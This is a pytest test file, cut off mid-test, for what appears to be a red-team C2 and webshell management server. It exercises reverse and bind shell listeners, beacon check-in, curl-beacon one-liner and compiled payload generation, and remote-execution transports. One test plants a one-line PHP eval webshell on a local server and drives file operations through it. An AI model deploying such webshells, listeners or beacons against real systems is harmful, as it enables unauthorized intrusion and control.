from __future__ import annotations

import base64
import hashlib
import json
import shutil
import socket
import sqlite3
import subprocess
import time
import urllib.request
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from redtrace.server import db
from redtrace.server.app import app
from redtrace.server import operations
from redtrace.server.routers import operations as operations_router


def _php_runtime_available() -> bool:
    binary = shutil.which("php")
    if binary is None:
        return False
    return (
        subprocess.run(
            [binary, "--version"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        ).returncode
        == 0
    )


@pytest.fixture
def client(tmp_path: Path, monkeypatch) -> TestClient:
    monkeypatch.setattr(db, "_db_path", None)
    db.configure(tmp_path / "redtrace.db")
    with TestClient(app) as test_client:
        yield test_client


def create_project(client: TestClient) -> str:
    response = client.post(
        "/projects",
        json={"title": "operations", "origin": "authorized target", "goal": "verified result"},
    )
    assert response.status_code == 201
    return response.json()["project"]["id"]


def test_legacy_project_scoped_resources_migrate_without_losing_source(
    tmp_path: Path, monkeypatch
) -> None:
    path = tmp_path / "legacy.db"
    legacy_schema = db.SCHEMA.replace(
        "project_id TEXT REFERENCES projects(id) ON DELETE SET NULL,\n    kind TEXT",
        "project_id TEXT NOT NULL REFERENCES projects(id) ON DELETE CASCADE,\n    kind TEXT",
    ).replace(
        "project_id TEXT REFERENCES projects(id) ON DELETE SET NULL,\n    resource_id TEXT",
        "project_id TEXT NOT NULL REFERENCES projects(id) ON DELETE CASCADE,\n    resource_id TEXT",
    )
    conn = sqlite3.connect(path)
    conn.executescript(legacy_schema)
    conn.execute(
        "INSERT INTO projects (id, title, created_at) VALUES ('proj_old', 'old', '2026-01-01T00:00:00Z')"
    )
    conn.execute(
        """
        INSERT INTO shared_resources (
            id, project_id, kind, name, created_by_type, created_by, created_at, updated_at
        ) VALUES ('ws_old', 'proj_old', 'webshell', 'old shell', 'worker', 'legacy',
                  '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')
        """
    )
    conn.execute(
        """
        INSERT INTO operation_tasks (
            id, project_id, resource_id, action, actor_type, actor, created_at
        ) VALUES ('op_old', 'proj_old', 'ws_old', 'command', 'human', 'legacy',
                  '2026-01-01T00:00:00Z')
        """
    )
    conn.execute(
        """
        INSERT INTO operation_results (
            id, project_id, task_id, content, size_bytes, sha256, created_at
        ) VALUES ('out_old', 'proj_old', 'op_old', 'ok', 2, 'hash',
                  '2026-01-01T00:00:00Z')
        """
    )
    conn.commit()
    conn.close()

    monkeypatch.setattr(db, "_db_path", None)
    db.configure(path)
    with db.get_conn() as migrated:
        project_column = next(
            row for row in migrated.execute("PRAGMA table_info(shared_resources)")
            if row["name"] == "project_id"
        )
        assert project_column["notnull"] == 0
        assert {
            row["table"] for row in migrated.execute("PRAGMA foreign_key_list(operation_tasks)")
        } == {"shared_resources", "projects"}
        assert next(
            row for row in migrated.execute("PRAGMA table_info(operation_tasks)")
            if row["name"] == "project_id"
        )["notnull"] == 0
        assert migrated.execute(
            "SELECT content FROM operation_results WHERE id = 'out_old'"
        ).fetchone()["content"] == "ok"
        metadata = json.loads(
            migrated.execute(
                "SELECT metadata_json FROM shared_resources WHERE id = 'ws_old'"
            ).fetchone()["metadata_json"]
        )
        assert metadata["source_project_id"] == "proj_old"
        migrated.execute("DELETE FROM projects WHERE id = 'proj_old'")
        persisted = migrated.execute(
            "SELECT project_id FROM shared_resources WHERE id = 'ws_old'"
        ).fetchone()
        assert persisted is not None
        assert persisted["project_id"] is None


def test_webshell_sessions_and_credentials_are_global_with_source_attribution(
    client: TestClient,
) -> None:
    first = create_project(client)
    second = create_project(client)
    webshell = client.post(
        f"/projects/{first}/resources",
        headers={"X-RedTrace-Worker": "codex-1", "X-RedTrace-Task": "explore", "X-RedTrace-Intent": "i001"},
        json={
            "kind": "webshell",
            "name": "global shell",
            "target": "https://target.test/shell.php",
            "secret": {"password": "hidden"},
            "actor_type": "worker",
            "actor": "codex-1",
            "worker": "codex-1",
            "intent_id": "i001",
        },
    )
    credential = client.post(
        f"/projects/{first}/resources",
        headers={"X-RedTrace-Worker": "codex-1", "X-RedTrace-Task": "explore", "X-RedTrace-Intent": "i001"},
        json={
            "kind": "credential_ref",
            "name": "DOMAIN\\alice",
            "target": "dc01.test",
            "metadata": {"credential_type": "active_directory", "username": "alice"},
            "secret": {"value": "Passw0rd!"},
            "actor_type": "worker",
            "actor": "codex-1",
        },
    )
    assert webshell.status_code == credential.status_code == 201

    listed = client.get(f"/projects/{second}/resources?limit=500")
    assert listed.status_code == 200
    items = {item["id"]: item for item in listed.json()["resources"]}
    shell = items[webshell.json()["resource"]["id"]]
    saved_credential = items[credential.json()["resource"]["id"]]
    assert listed.json()["scope"] == "global"
    assert shell["source_project_id"] == first
    assert shell["source"]["worker"] == "codex-1"
    assert saved_credential["metadata"]["credential_type"] == "active_directory"
    assert saved_credential["has_secret"] is True
    assert saved_credential["secret"] == {"value": "Passw0rd!"}

    snapshot = client.get(
        f"/projects/{second}/operations/snapshot",
        headers={"X-RedTrace-Worker": "codex-2"},
        params={"kinds": "credential_ref"},
    ).json()["resources"]
    assert snapshot[0]["secret"] == {"value": "Passw0rd!"}

    exported = client.get(f"/projects/{first}/export?format=yaml").text
    assert "Passw0rd!" in exported


def test_reverse_listener_creates_global_interactive_session(client: TestClient) -> None:
    project_id = create_project(client)
    probe = socket.socket()
    probe.bind(("127.0.0.1", 0))
    port = probe.getsockname()[1]
    probe.close()
    listener = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "reverse-test",
            "target": f"127.0.0.1:{port}",
            "status": "available",
            "metadata": {
                "listener_type": "tcp_reverse",
                "bind_host": "127.0.0.1",
                "bind_port": port,
                "callback_host": "127.0.0.1",
            },
            "actor": "tester",
        },
    )
    assert listener.status_code == 201
    listener_id = listener.json()["resource"]["id"]

    channel = socket.socket()
    deadline = time.monotonic() + 3
    while True:
        try:
            channel.connect(("127.0.0.1", port))
            break
        except OSError:
            if time.monotonic() >= deadline:
                raise
            time.sleep(0.05)

    session = None
    while time.monotonic() < deadline:
        resources = client.get(f"/projects/{project_id}/resources?kind=c2_session").json()["resources"]
        session = next((item for item in resources if item["parent_resource_id"] == listener_id), None)
        if session:
            break
        time.sleep(0.05)
    assert session is not None
    assert session["metadata"]["connection_type"] == "reverse"
    assert session["metadata"]["shell_type"] == "raw_tcp"

    def respond() -> None:
        assert channel.recv(1024).decode().strip() == "whoami"
        channel.sendall(b"root\n")

    import threading

    responder = threading.Thread(target=respond)
    responder.start()
    operation = client.post(
        f"/projects/{project_id}/resources/{session['id']}/tasks",
        json={"action": "command", "arguments": {"command": "whoami"}, "actor": "tester"},
    )
    assert operation.status_code == 202
    operation_id = operation.json()["task"]["id"]
    result = None
    for _ in range(60):
        result = client.get(f"/projects/{project_id}/operations/tasks/{operation_id}").json()["task"]
        if result["status"] in {"succeeded", "failed"}:
            break
        time.sleep(0.05)
    responder.join(timeout=2)
    channel.close()
    assert result is not None and result["status"] == "succeeded"
    assert "root" in result["output_summary"]


def test_listener_types_are_real_transports_and_http_payload_uses_server_url(
    client: TestClient,
) -> None:
    project_id = create_project(client)
    rejected = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "not-a-transport",
            "metadata": {"listener_type": "sliver"},
        },
    )
    assert rejected.status_code == 400

    listener_response = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "worker-http",
            "metadata": {"listener_type": "http_beacon"},
        },
    )
    listener = listener_response.json()["resource"]
    payload = client.post(
        f"/projects/{project_id}/c2/payloads/oneliner",
        json={"listener_id": listener["id"], "kind": "curl_beacon"},
    )
    assert payload.status_code == 200
    assert f"http://testserver/c2/checkin/{listener['id']}" in payload.json()["oneliner"]


def test_bind_listener_connects_and_exposes_an_interactive_session(
    client: TestClient,
) -> None:
    project_id = create_project(client)
    bind_shell = socket.socket()
    bind_shell.bind(("127.0.0.1", 0))
    bind_shell.listen(1)
    bind_shell.settimeout(3)
    port = bind_shell.getsockname()[1]

    listener = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "bind-test",
            "status": "available",
            "metadata": {
                "listener_type": "tcp_bind",
                "target_host": "127.0.0.1",
                "bind_port": port,
            },
            "actor": "tester",
        },
    )
    assert listener.status_code == 201
    listener_id = listener.json()["resource"]["id"]
    channel, _ = bind_shell.accept()
    channel.settimeout(3)

    deadline = time.monotonic() + 3
    session = None
    while time.monotonic() < deadline:
        resources = client.get(
            f"/projects/{project_id}/resources?kind=c2_session"
        ).json()["resources"]
        session = next(
            (item for item in resources if item["parent_resource_id"] == listener_id),
            None,
        )
        if session:
            break
        time.sleep(0.05)
    assert session is not None
    assert session["metadata"]["connection_type"] == "bind"

    def respond() -> None:
        assert channel.recv(1024).decode().strip() == "hostname"
        channel.sendall(b"bind-target\n")

    import threading

    responder = threading.Thread(target=respond)
    responder.start()
    operation = client.post(
        f"/projects/{project_id}/resources/{session['id']}/tasks",
        json={"action": "command", "arguments": {"command": "hostname"}, "actor": "tester"},
    )
    assert operation.status_code == 202
    operation_id = operation.json()["task"]["id"]
    result = None
    for _ in range(60):
        result = client.get(
            f"/projects/{project_id}/operations/tasks/{operation_id}"
        ).json()["task"]
        if result["status"] in {"succeeded", "failed"}:
            break
        time.sleep(0.05)
    responder.join(timeout=2)
    channel.close()
    bind_shell.close()
    assert result is not None and result["status"] == "succeeded"
    assert "bind-target" in result["output_summary"]


@pytest.mark.parametrize(
    ("shell_type", "expected_executable"),
    [("ssh", "ssh"), ("evil_winrm", "evil-winrm"), ("psexec", "psexec.py"), ("wmi", "wmiexec.py")],
)
def test_direct_session_transports_execute_through_the_session_hub(
    monkeypatch, shell_type: str, expected_executable: str
) -> None:
    captured: dict = {}

    def run(argv, **kwargs):
        captured.update({"argv": argv, **kwargs})
        return SimpleNamespace(stdout="transport-ok\n", stderr="", returncode=0)

    monkeypatch.setattr(operations.subprocess, "run", run)
    output = operations.execute_direct_session(
        {
            "target": "10.0.0.8",
            "metadata_json": json.dumps(
                {"shell_type": shell_type, "connection_type": "direct", "username": "alice", "domain": "DOMAIN"}
            ),
            "secret_json": json.dumps({"password": "secret"} if shell_type == "evil_winrm" else {}),
        },
        {"input_json": json.dumps({"command": "whoami"}), "action": "command"},
    )
    assert output == "transport-ok\n"
    assert captured["argv"][0] == expected_executable
    if shell_type == "evil_winrm":
        assert "-c" not in captured["argv"]
        assert captured["input"] == "whoami\nexit\n"


def test_external_c2_session_executes_through_adapter(monkeypatch) -> None:
    captured: dict = {}

    class Response:
        text = "sliver-ok"

        def raise_for_status(self) -> None:
            return None

    def post(url, **kwargs):
        captured.update({"url": url, **kwargs})
        return Response()

    monkeypatch.setattr(operations.requests, "post", post)
    output = operations.execute_direct_session(
        {
            "target": "sliver-session-7",
            "metadata_json": json.dumps(
                {
                    "shell_type": "sliver",
                    "connection_type": "external_c2",
                    "framework": "sliver",
                    "external_session_id": "session-7",
                }
            ),
            "secret_json": json.dumps(
                {"endpoint": "http://adapter.test/execute", "token": "adapter-token"}
            ),
        },
        {"input_json": json.dumps({"command": "whoami"}), "action": "command"},
    )
    assert output == "sliver-ok"
    assert captured["url"] == "http://adapter.test/execute"
    assert captured["headers"]["Authorization"] == "Bearer adapter-token"
    assert captured["json"]["session_id"] == "session-7"


def test_direct_sessions_do_not_expire_like_polling_beacons(client: TestClient) -> None:
    project_id = create_project(client)
    created = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_session",
            "name": "persistent-ssh",
            "target": "10.0.0.8",
            "metadata": {"shell_type": "ssh", "connection_type": "direct"},
            "actor": "tester",
        },
    )
    session_id = created.json()["resource"]["id"]
    with db.get_conn() as conn:
        conn.execute(
            "UPDATE shared_resources SET last_seen_at = '2020-01-01T00:00:00Z' WHERE id = ?",
            (session_id,),
        )
    listed = client.get(f"/projects/{project_id}/resources?kind=c2_session").json()["resources"]
    session = next(item for item in listed if item["id"] == session_id)
    assert session["status"] == "available"


def test_global_direct_session_can_open_shell_without_selected_project(
    client: TestClient, monkeypatch
) -> None:
    captured: dict = {}

    def run(argv, **kwargs):
        captured["argv"] = argv
        return SimpleNamespace(stdout="global-shell-ok\n", stderr="", returncode=0)

    monkeypatch.setattr(operations.subprocess, "run", run)
    session = client.post(
        "/projects/_global/resources",
        json={
            "kind": "c2_session",
            "name": "manual-ssh",
            "target": "10.0.0.8",
            "metadata": {
                "shell_type": "ssh",
                "connection_type": "direct",
                "username": "alice",
            },
            "secret": {"private_key_path": "/tmp/test-key"},
        },
    ).json()["resource"]
    queued = client.post(
        f"/projects/_global/resources/{session['id']}/tasks",
        json={"action": "command", "arguments": {"command": "whoami"}},
    )
    assert queued.status_code == 202
    task_id = queued.json()["task"]["id"]
    task = None
    for _ in range(60):
        task = client.get(f"/projects/_global/operations/tasks/{task_id}").json()["task"]
        if task["status"] in {"succeeded", "failed"}:
            break
        time.sleep(0.05)
    assert task is not None and task["status"] == "succeeded"
    assert "global-shell-ok" in client.get(task["result_ref"]).text
    assert captured["argv"][-1] == "whoami"


def test_worker_registers_webshell_without_exposing_secret_and_reuses_it(
    client: TestClient,
    monkeypatch,
) -> None:
    project_id = create_project(client)
    headers = {
        "X-RedTrace-Worker": "codex-1",
        "X-RedTrace-Task": "explore",
        "X-RedTrace-Intent": "i001",
    }
    created = client.post(
        f"/projects/{project_id}/resources",
        headers=headers,
        json={
            "kind": "webshell",
            "name": "primary shell",
            "target": "https://target.test/shell.php",
            "summary": "www-data on target.test",
            "metadata": {"method": "POST", "command_param": "pass"},
            "secret": {"password": "never-return-this"},
            "actor_type": "worker",
            "actor": "spoofed",
        },
    )
    assert created.status_code == 201
    resource = created.json()["resource"]
    assert resource["created_by"] == "codex-1"
    assert resource["has_secret"] is True
    assert "secret" not in resource
    assert "password" not in created.text

    class Response:
        text = "uid=33(www-data)"
        encoding = "utf-8"

        def raise_for_status(self) -> None:
            return None

    captured: dict = {}

    def request(method, url, **kwargs):
        captured.update({"method": method, "url": url, **kwargs})
        return Response()

    monkeypatch.setattr(operations.requests, "request", request)
    queued = client.post(
        f"/projects/{project_id}/resources/{resource['id']}/tasks",
        headers=headers,
        json={
            "action": "command",
            "arguments": {"command": "id"},
            "actor_type": "worker",
            "actor": "codex-1",
            "risk": "low",
        },
    )
    assert queued.status_code == 202
    operation_id = queued.json()["task"]["id"]
    direct = client.get(
        f"/projects/{project_id}/operations/tasks/{operation_id}"
    )
    assert direct.status_code == 200
    assert direct.json()["task"]["id"] == operation_id
    for _ in range(50):
        tasks = client.get(f"/projects/{project_id}/operations/tasks").json()["tasks"]
        task = next(item for item in tasks if item["id"] == operation_id)
        if task["status"] == "succeeded":
            break
        time.sleep(0.02)
    assert task["status"] == "succeeded"
    assert task["output_summary"] == "uid=33(www-data)"
    assert captured["data"] == {"pass": "id"}
    assert "never-return-this" not in json.dumps(captured)
    result_id = task["result_ref"].rsplit("/", 1)[-1]
    assert client.get(f"/projects/{project_id}/operations/results/{result_id}").text == "uid=33(www-data)"
    assert next((db.output_root("webshell") / "results").glob(f"*-{result_id}.txt")).read_text() == "uid=33(www-data)"

    detail = client.get(f"/projects/{project_id}").json()
    resource_fact = next(fact for fact in detail["facts"] if resource["id"] in fact["description"])
    assert "never-return-this" not in resource_fact["description"]


@pytest.mark.parametrize(
    ("kind", "metadata", "secret"),
    [
        ("webshell", {"method": "POST", "command_param": "cmd"}, {"password": "test-only"}),
        ("c2_listener", {"listener_type": "http_beacon"}, {}),
        ("c2_session", {"shell_type": "ssh", "connection_type": "direct"}, {}),
        ("credential_ref", {"credential_type": "host"}, {"value": "test-only"}),
    ],
)
def test_human_resource_delete_removes_its_graph_fact(
    client: TestClient, kind: str, metadata: dict, secret: dict
) -> None:
    project_id = create_project(client)
    created = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": kind,
            "name": "待删除资源",
            "target": "https://delete.invalid/shell.php",
            "summary": "删除回归测试",
            "metadata": metadata,
            "secret": secret,
            "actor_type": "human",
            "actor": "测试员",
        },
    )
    assert created.status_code == 201
    resource = created.json()["resource"]
    resource_id = resource["id"]
    fact_id = resource["fact_id"]

    deleted = client.delete(
        f"/projects/{project_id}/resources/{resource_id}?actor=测试员"
    )

    assert deleted.status_code == 204
    assert client.get(f"/projects/{project_id}/resources/{resource_id}").status_code == 404
    listed = client.get(f"/projects/{project_id}/resources").json()["resources"]
    assert resource_id not in {resource["id"] for resource in listed}
    facts = client.get(f"/projects/{project_id}").json()["facts"]
    assert fact_id not in {fact["id"] for fact in facts}
    changes = client.get(
        f"/projects/{project_id}/blackboard/changes", params={"since": 0, "limit": 100}
    ).json()["changes"]
    assert any(
        change["kind"] == "fact"
        and change["node_id"] == fact_id
        and change["action"] == "removed"
        for change in changes
    )
    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
    assert any(
        event["action"] == "resource.delete" and event["resource_id"] == resource_id
        for event in audit
    )


def test_releasing_resource_fact_keeps_resource_and_blocks_used_facts(
    client: TestClient,
) -> None:
    project_id = create_project(client)
    resource = client.post(
        f"/projects/{project_id}/resources",
        json={"kind": "credential_ref", "name": "keep-me", "secret": {"value": "secret"}},
    ).json()["resource"]
    fact_id = resource["fact_id"]

    released = client.delete(f"/projects/{project_id}/blackboard/facts/{fact_id}")
    assert released.status_code == 204
    kept = client.get(f"/projects/{project_id}/resources/{resource['id']}").json()["resource"]
    assert kept["fact_id"] is None
    assert client.get(f"/projects/{project_id}/blackboard/nodes/{fact_id}").json()["found"] is False

    leaf_intent = client.post(
        f"/projects/{project_id}/intents",
        json={"from": ["origin"], "description": "leaf", "creator": "admin", "worker": "admin"},
    ).json()
    leaf = client.post(
        f"/projects/{project_id}/intents/{leaf_intent['id']}/conclude",
        json={"worker": "admin", "description": "leaf result"},
    ).json()["fact"]
    assert client.delete(f"/projects/{project_id}/blackboard/facts/{leaf['id']}").status_code == 204
    intents = client.get(f"/projects/{project_id}").json()["intents"]
    assert leaf_intent["id"] not in {intent["id"] for intent in intents}

    parent_intent = client.post(
        f"/projects/{project_id}/intents",
        json={"from": ["origin"], "description": "parent", "creator": "admin", "worker": "admin"},
    ).json()
    parent = client.post(
        f"/projects/{project_id}/intents/{parent_intent['id']}/conclude",
        json={"worker": "admin", "description": "parent result"},
    ).json()["fact"]
    client.post(
        f"/projects/{project_id}/intents",
        json={"from": [parent["id"]], "description": "child", "creator": "admin"},
    )
    assert client.delete(f"/projects/{project_id}/blackboard/facts/{parent['id']}").status_code == 409


def test_resource_delete_detaches_its_fact_from_graph_intents(client: TestClient) -> None:
    project_id = create_project(client)
    resource = client.post(
        f"/projects/{project_id}/resources",
        json={"kind": "webshell", "name": "used-resource"},
    ).json()["resource"]
    intent = client.post(
        f"/projects/{project_id}/intents",
        json={
            "from": [resource["fact_id"]],
            "description": "depends on resource",
            "creator": "admin",
            "worker": "admin",
        },
    ).json()

    assert client.delete(
        f"/projects/{project_id}/resources/{resource['id']}"
    ).status_code == 204
    project = client.get(f"/projects/{project_id}").json()
    assert resource["fact_id"] not in {fact["id"] for fact in project["facts"]}
    assert intent["id"] not in {item["id"] for item in project["intents"]}


@pytest.mark.skipif(
    not _php_runtime_available(),
    reason="a working PHP runtime is required for the eval-shell compatibility test",
)
def test_simple_php_eval_webshell_can_be_tested_and_reused(
    client: TestClient,
    tmp_path: Path,
) -> None:
    target_os = "windows" if shutil.which("powershell") else "linux"
    if target_os == "linux":
        find_probe = subprocess.run(
            ["find", str(tmp_path), "-maxdepth", "0", "-printf", ""],
            check=False,
            capture_output=True,
            text=True,
        )
        if find_probe.returncode:
            pytest.skip("the WebShell Linux file-manager test requires GNU find")

    demo = tmp_path / "shell.php"
    demo.write_text("<?php  @eval($_POST['cmd']);  ?>", encoding="utf-8")
    with socket.socket() as server_socket:
        server_socket.bind(("127.0.0.1", 0))
        port = server_socket.getsockname()[1]
    process = subprocess.Popen(
        [shutil.which("php") or "php", "-S", f"127.0.0.1:{port}", "-t", str(tmp_path)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    target = f"http://127.0.0.1:{port}/shell.php"
    try:
        for _ in range(50):
            try:
                urllib.request.urlopen(target, timeout=0.2).close()
                break
            except Exception:
                time.sleep(0.05)
        else:
            pytest.fail("PHP test server did not start")

        project_id = create_project(client)
        tested = client.post(
            f"/projects/{project_id}/webshell/test",
            json={
                "target": target,
                "password": "cmd",
                "shell_type": "php",
                "protocol": "eval",
                "method": "POST",
                "command_param": "cmd",
                "target_os": target_os,
                "encoding": "utf-8",
            },
        )
        assert tested.status_code == 200
        assert tested.json()["ok"] is True

        created = client.post(
            f"/projects/{project_id}/resources",
            json={
                "kind": "webshell",
                "name": "PHP eval demo",
                "target": target,
                "metadata": {
                    "shell_type": "php",
                    "protocol": "eval",
                    "method": "POST",
                    "command_param": "cmd",
                    "os": target_os,
                    "encoding": "utf-8",
                    "verify_tls": False,
                },
                "secret": {"password": "cmd"},
            },
        )
        assert created.status_code == 201
        resource = created.json()["resource"]
        queued = client.post(
            f"/projects/{project_id}/resources/{resource['id']}/tasks",
            json={"action": "command", "arguments": {"command": "echo REDTRACE_PHP_EVAL_OK"}},
        )
        assert queued.status_code == 202
        operation_id = queued.json()["task"]["id"]
        for _ in range(100):
            tasks = client.get(f"/projects/{project_id}/operations/tasks").json()["tasks"]
            task = next(item for item in tasks if item["id"] == operation_id)
            if task["status"] in {"succeeded", "failed"}:
                break
            time.sleep(0.02)
        assert task["status"] == "succeeded"
        assert "REDTRACE_PHP_EVAL_OK" in task["output_summary"]

        managed = tmp_path / "managed"

        def run_action(action: str, arguments: dict, *, approval: bool = False) -> dict:
            response = client.post(
                f"/projects/{project_id}/resources/{resource['id']}/tasks",
                json={
                    "action": action,
                    "arguments": arguments,
                    "risk": "high" if approval else "low",
                    "requires_approval": approval,
                },
            )
            assert response.status_code == 202
            current = response.json()["task"]
            if approval:
                approved = client.post(
                    f"/projects/{project_id}/operations/tasks/{current['id']}/approval",
                    json={"actor": "operator", "decision": "approve"},
                )
                assert approved.status_code == 200
            for _ in range(100):
                tasks = client.get(f"/projects/{project_id}/operations/tasks").json()["tasks"]
                current = next(item for item in tasks if item["id"] == current["id"])
                if current["status"] in {"succeeded", "failed"}:
                    break
                time.sleep(0.02)
            assert current["status"] == "succeeded", current
            return current

        # Use the same one-line eval shell for the complete file-manager chain.
        run_action("create_directory", {"path": str(managed)})
        file_path = managed / "notes.txt"
        encoded = base64.b64encode("RedTrace 文件管理".encode()).decode()
        run_action("write_file", {"path": str(file_path), "content_base64": encoded})
        listed = run_action("list_files", {"path": str(managed)})
        listing = client.get(listed["result_ref"]).text
        assert "\tnotes.txt\t" in listing
        read = run_action("read_file", {"path": str(file_path)})
        assert base64.b64decode(client.get(read["result_ref"]).text).decode() == "RedTrace 文件管理"
        renamed = managed / "renamed.txt"
        run_action("move_file", {"path": str(file_path), "destination": str(renamed)})
        assert renamed.exists()
        run_action("delete_file", {"path": str(managed)}, approval=True)
        assert not managed.exists()
    finally:
        process.terminate()
        process.wait(timeout=5)


def test_c2_listener_session_task_approval_poll_and_result(client: TestClient) -> None:
    project_id = create_project(client)
    listener_response = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "project beacon",
            "target": "https://redtrace.test/c2",
            "status": "available",
            "actor": "Alice",
        },
    )
    assert listener_response.status_code == 201
    listener = listener_response.json()["resource"]
    listener_token = listener_response.json()["secret_once"]
    assert listener_token not in json.dumps(listener)

    checkin = client.post(
        f"/c2/checkin/{listener['id']}",
        headers={"X-RedTrace-Listener-Token": listener_token},
        json={
            "external_id": "host-01",
            "hostname": "eng-ws01",
            "username": "operator",
            "os": "windows",
            "arch": "amd64",
            "process": "agent.exe",
            "pid": 4242,
            "capabilities": ["command", "upload"],
        },
    )
    assert checkin.status_code == 200
    session_id = checkin.json()["session_id"]
    session_token = checkin.json()["session_token"]

    worker_headers = {
        "X-RedTrace-Worker": "pi-1",
        "X-RedTrace-Task": "explore",
        "X-RedTrace-Intent": "i007",
    }
    operation = client.post(
        f"/projects/{project_id}/resources/{session_id}/tasks",
        headers=worker_headers,
        json={
            "action": "command",
            "arguments": {"command": "whoami", "publish_result": True},
            "risk": "high",
            "actor_type": "worker",
            "actor": "pi-1",
        },
    )
    assert operation.status_code == 202
    task = operation.json()["task"]
    assert task["status"] == "awaiting_approval"

    approved = client.post(
        f"/projects/{project_id}/operations/tasks/{task['id']}/approval",
        json={"actor": "Alice", "decision": "approve"},
    )
    assert approved.status_code == 200
    assert approved.json()["task"]["status"] == "queued"

    poll = client.post(
        f"/c2/sessions/{session_id}/poll",
        headers={"X-RedTrace-Session-Token": session_token},
    )
    assert poll.status_code == 200
    assert poll.json()["tasks"][0]["arguments"]["command"] == "whoami"

    completed = client.post(
        f"/c2/sessions/{session_id}/results/{task['id']}",
        headers={"X-RedTrace-Session-Token": session_token},
        json={
            "success": True,
            "output": "very-long-full-output-corp\\alice",
            "summary": "Confirmed domain identity",
        },
    )
    assert completed.status_code == 200
    assert completed.json()["task"]["status"] == "succeeded"
    assert completed.json()["task"]["fact_id"]

    resources = client.get(f"/projects/{project_id}/resources").json()["resources"]
    kinds = {item["kind"] for item in resources}
    assert {"c2_listener", "c2_session", "result"} <= kinds
    assert all("session_token" not in json.dumps(item) for item in resources)

    exported = client.get(f"/projects/{project_id}/export?format=yaml").text
    assert "shared_resources:" in exported
    assert "operation_tasks:" in exported
    assert listener_token not in exported
    assert session_token not in exported
    assert "very-long-full-output-corp\\alice" not in exported
    assert "Confirmed domain identity" in exported

    with db.get_conn() as conn:
        conn.execute(
            "UPDATE shared_resources SET last_seen_at = '2000-01-01T00:00:00Z' WHERE id = ?",
            (session_id,),
        )
    sessions = client.get(
        f"/projects/{project_id}/resources",
        params={"kind": "c2_session"},
    ).json()["resources"]
    assert sessions[0]["status"] == "offline"
    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
    assert any(event["action"] == "c2.session_offline" for event in audit)


@pytest.mark.skipif(shutil.which("go") is None, reason="Go is required for the Beacon build test")
def test_c2_payload_api_generates_oneliner_and_compiled_beacon(client: TestClient) -> None:
    project_id = create_project(client)
    listener_response = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "HTTP Beacon",
            "target": "0.0.0.0:8443",
            "status": "available",
            "metadata": {
                "listener_type": "http_beacon",
                "bind_host": "0.0.0.0",
                "bind_port": 8443,
                "callback_host": "c2.example.test",
            },
        },
    )
    assert listener_response.status_code == 201
    listener = listener_response.json()["resource"]
    listener_token = listener_response.json()["secret_once"]

    kinds = client.get(
        f"/projects/{project_id}/c2/listeners/{listener['id']}/oneliner-kinds"
    )
    assert kinds.status_code == 200
    assert kinds.json()["kinds"] == ["curl_beacon"]

    generated = client.post(
        f"/projects/{project_id}/c2/payloads/oneliner",
        json={"listener_id": listener["id"], "kind": "curl_beacon"},
    )
    assert generated.status_code == 200
    assert f"/c2/checkin/{listener['id']}" in generated.json()["oneliner"]
    assert listener_token in generated.json()["oneliner"]

    built = client.post(
        f"/projects/{project_id}/c2/payloads/build",
        json={
            "listener_id": listener["id"],
            "callback_url": "http://127.0.0.1:8765",
            "os": "linux",
            "arch": "amd64",
        },
    )
    assert built.status_code == 201
    payload = built.json()["payload"]
    assert payload["kind"] == "c2_payload"
    assert payload["metadata"]["size_bytes"] > 0
    downloaded = client.get(payload["target"])
    assert downloaded.status_code == 200
    assert len(downloaded.content) == payload["metadata"]["size_bytes"]

    exported = client.get(f"/projects/{project_id}/export?format=yaml").text
    assert listener_token not in exported


def test_c2_payload_and_profile_are_project_scoped_references(client: TestClient) -> None:
    project_id = create_project(client)
    payload = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_payload",
            "name": "Windows x64 Beacon",
            "target": "artifact://payloads/beacon.exe",
            "summary": "built by the controlled payload pipeline",
            "metadata": {"platform": "windows", "arch": "amd64", "sha256": "abc123"},
            "actor": "operator",
        },
    )
    profile = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_profile",
            "name": "CDN API profile",
            "target": "profile://cdn-api-v1",
            "summary": "non-secret traffic profile parameters",
            "metadata": {"path": "/api/v1/sync", "jitter": 20},
            "actor": "operator",
        },
    )

    assert payload.status_code == 201
    assert payload.json()["resource"]["id"].startswith("pay_")
    assert profile.status_code == 201
    assert profile.json()["resource"]["id"].startswith("prf_")

    listed = client.get(f"/projects/{project_id}/resources").json()["resources"]
    assert {item["kind"] for item in listed} >= {"c2_payload", "c2_profile"}
    facts = client.get(f"/projects/{project_id}").json()["facts"]
    assert any("C2 载荷" in fact["description"] for fact in facts)
    assert any("C2 流量伪装" in fact["description"] for fact in facts)


def test_payload_oneliner_and_worker_upload_are_retained_and_shareable(client: TestClient) -> None:
    project_id = create_project(client)
    listener = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "Worker HTTP",
            "target": "127.0.0.1:8443",
            "metadata": {"listener_type": "http_beacon", "bind_port": 8443},
        },
    ).json()["resource"]
    worker_headers = {
        "X-RedTrace-Worker": "worker-payload",
        "X-RedTrace-Task": "payload-build",
        "X-RedTrace-Intent": "i-payload",
    }

    generated = client.post(
        f"/projects/{project_id}/c2/payloads/oneliner",
        headers=worker_headers,
        json={"listener_id": listener["id"], "kind": "curl_beacon"},
    )
    assert generated.status_code == 200
    command_payload = generated.json()["payload"]
    assert command_payload["metadata"]["command"] == generated.json()["oneliner"]
    assert command_payload["metadata"]["source_type"] == "worker"

    content = b"redtrace-payload-evidence"
    uploaded = client.post(
        f"/projects/{project_id}/c2/payloads/upload",
